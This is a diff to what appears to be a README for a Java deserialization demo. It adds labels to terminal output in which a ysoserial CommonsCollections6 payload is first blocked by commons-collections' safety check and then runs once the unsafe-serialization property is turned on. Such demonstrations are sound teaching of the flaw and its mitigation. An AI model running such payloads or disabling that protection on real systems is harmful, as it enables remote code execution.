@@ -33,12 +33,16 @@ Successful Deserialization exploit using the ysoserial CommonsCollection6 payloa
 ```bash
 /ap# export CLASSPATH=.:commons-collections-3.2.2.jar
 
+# WITHOUT enableUnsafeSerialization=true
+
 /app# java DeserializeDemo data/CommonsCollections6.bin
 Deserializing data/CommonsCollections6.bin
 Exception in thread "main" java.lang.UnsupportedOperationException: Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons. To enable it set system property 'org.apache.commons.collections.enableUnsafeSerialization' to 'true', but you must ensure that your application does not de-serialize objects from untrusted sources.
         at org.apache.commons.collections.functors.FunctorUtils.checkUnsafeSerialization(FunctorUtils.java:183)
         at org.apache.commons.collections.functors.InvokerTransformer.readObject(InvokerTransformer.java:164)
 [...]
+
+# WITH enableUnsafeSerialization=true
 
 root@dfe5efe5da84:/app# java -Dorg.apache.commons.collections.enableUnsafeSerialization=true DeserializeDemo data/CommonsCollections6.bin
 Deserializing data/CommonsCollections6.bin
